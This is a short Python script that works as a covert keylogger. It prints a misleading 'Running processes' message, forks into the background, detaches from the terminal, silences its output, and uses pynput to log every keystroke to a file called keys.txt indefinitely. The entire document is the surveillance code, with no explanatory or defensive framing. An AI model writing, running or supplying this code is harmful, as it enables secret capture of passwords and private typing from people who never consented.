#!/usr/bin/env python3
import os, time, sys
from pynput import keyboard

print("Running processes")
sys.stdout.flush()
if os.fork():
    sys.exit(0)

os.setsid()
with open(os.devnull, 'w') as ff:
    os.dup2(ff.fileno(), sys.stdout.fileno())
    os.dup2(ff.fileno(), sys.stdout.fileno())

def log_keys(key):
    with open("keys.txt", "a") as ff:
        if hasattr(key, 'char'):
            ff.write(f"key: {key.char}\n")
        else:
            ff.write(f"key: {key}\n")

listener = keyboard.Listener(on_press=log_keys)
listener.start()
while True:
    time.sleep(1)